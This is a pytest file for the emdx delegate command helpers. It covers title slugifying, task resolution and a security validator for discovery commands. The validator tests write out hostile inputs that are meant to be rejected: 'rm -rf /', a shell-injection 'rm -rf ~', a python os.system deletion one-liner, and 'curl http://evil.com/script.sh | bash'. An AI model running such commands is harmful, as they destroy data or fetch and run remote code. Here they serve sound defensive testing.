"""Tests for delegate command helper functions."""

from unittest.mock import patch

import click
import pytest

from emdx.commands.delegate import (
    _slugify_title,
    _resolve_task,
    _validate_discovery_command,
    PR_INSTRUCTION,
    SAFE_DISCOVERY_COMMANDS,
)


class TestSlugifyTitle:
    """Tests for _slugify_title — converts document titles to git branch slugs."""

    def test_simple_title(self):
        assert _slugify_title("Fix auth bug") == "fix-auth-bug"

    def test_strips_gameplan_prefix(self):
        assert _slugify_title("Gameplan #1: Contextual Save") == "contextual-save"

    def test_strips_feature_prefix(self):
        assert _slugify_title("Feature: Dark Mode Toggle") == "dark-mode-toggle"

    def test_strips_plan_prefix(self):
        assert _slugify_title("Plan #42: Refactor Database") == "refactor-database"

    def test_strips_doc_prefix(self):
        assert _slugify_title("Document: API Design") == "api-design"

    def test_removes_special_characters(self):
        assert _slugify_title("Smart Priming (context-aware)") == "smart-priming-context-aware"

    def test_collapses_whitespace(self):
        assert _slugify_title("fix   the   thing") == "fix-the-thing"

    def test_truncates_long_slugs(self):
        result = _slugify_title("A" * 100)
        assert len(result) <= 50

    def test_empty_after_strip_returns_feature(self):
        assert _slugify_title("Gameplan #1:") == "feature"

    def test_only_special_chars_returns_feature(self):
        assert _slugify_title("!!!???") == "feature"

    def test_no_trailing_hyphens(self):
        result = _slugify_title("test - ")
        assert not result.endswith("-")


class TestResolveTask:
    """Tests for _resolve_task — resolves doc IDs to content."""

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_loads_doc(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Test Doc",
            "content": "Hello world",
        }
        result = _resolve_task("42")
        assert "Hello world" in result
        assert "Test Doc" in result
        mock_get.assert_called_once_with(42)

    @patch("emdx.commands.delegate.get_document")
    def test_numeric_id_with_pr_adds_instructions(self, mock_get):
        mock_get.return_value = {
            "id": 42,
            "title": "Fix Auth",
            "content": "Fix the authentication bug",
        }
        result = _resolve_task("42", pr=True)
        assert "Fix the authentication bug" in result
        assert "pull request" in result.lower() or "PR" in result

    def test_text_task_returned_as_is(self):
        result = _resolve_task("analyze the auth module")
        assert result == "analyze the auth module"

    @patch("emdx.commands.delegate.get_document")
    def test_missing_doc_falls_back(self, mock_get):
        mock_get.return_value = None
        result = _resolve_task("99999")
        # Should return the string as-is when doc not found
        assert "99999" in result


class TestPRInstruction:
    """Tests for PR instruction constant."""

    def test_pr_instruction_mentions_branch(self):
        assert "branch" in PR_INSTRUCTION.lower()

    def test_pr_instruction_mentions_pr_create(self):
        assert "gh pr create" in PR_INSTRUCTION


class TestValidateDiscoveryCommand:
    """Tests for _validate_discovery_command — security validation for --each."""

    def test_allowed_commands_pass(self):
        """Valid discovery commands should be accepted."""
        for cmd in ["fd -e py", "find . -name '*.py'", "git ls-files", "ls -la"]:
            result = _validate_discovery_command(cmd)
            assert isinstance(result, list)
            assert len(result) > 0

    def test_fd_command_parsed_correctly(self):
        """fd command should be parsed into arguments."""
        result = _validate_discovery_command("fd -e py src/")
        assert result == ["fd", "-e", "py", "src/"]

    def test_find_command_parsed_correctly(self):
        """find command should be parsed into arguments."""
        result = _validate_discovery_command("find . -name '*.py'")
        assert result == ["find", ".", "-name", "*.py"]

    def test_git_ls_files_allowed(self):
        """git ls-files should be allowed."""
        result = _validate_discovery_command("git ls-files")
        assert result == ["git", "ls-files"]

    def test_full_path_to_allowed_command(self):
        """Commands with full paths should work if basename is allowed."""
        result = _validate_discovery_command("/usr/bin/fd -e py")
        assert result[0] == "/usr/bin/fd"

    def test_dangerous_command_rejected(self):
        """Dangerous commands like rm should be rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("rm -rf /")

    def test_shell_injection_rejected(self):
        """Shell injection attempts should be rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("; rm -rf ~")

    def test_pipe_injection_rejected(self):
        """Pipe injection should be rejected (entire string is parsed, not shell-expanded)."""
        # With shlex.split and no shell=True, this becomes ["fd", "|", "xargs", "rm"]
        # The base command "fd" is allowed, but the "|" is just a literal argument
        result = _validate_discovery_command("fd | xargs rm")
        # The command is parsed literally - the pipe is just an argument
        assert result == ["fd", "|", "xargs", "rm"]
        # This is safe because shell=False means no pipe interpretation

    def test_arbitrary_command_rejected(self):
        """Arbitrary executables should be rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("curl http://evil.com/script.sh | bash")

    def test_python_command_rejected(self):
        """Python interpreter should be rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("python -c 'import os; os.system(\"rm -rf /\")'")

    def test_empty_command_rejected(self):
        """Empty commands should be rejected."""
        with pytest.raises(click.exceptions.Exit):
            _validate_discovery_command("")

    def test_safe_commands_constant_exists(self):
        """SAFE_DISCOVERY_COMMANDS should include expected safe commands."""
        assert "fd" in SAFE_DISCOVERY_COMMANDS
        assert "find" in SAFE_DISCOVERY_COMMANDS
        assert "git" in SAFE_DISCOVERY_COMMANDS
        assert "rg" in SAFE_DISCOVERY_COMMANDS
        # Dangerous commands should NOT be in the allowlist
        assert "rm" not in SAFE_DISCOVERY_COMMANDS
        assert "curl" not in SAFE_DISCOVERY_COMMANDS
        assert "bash" not in SAFE_DISCOVERY_COMMANDS
        assert "python" not in SAFE_DISCOVERY_COMMANDS

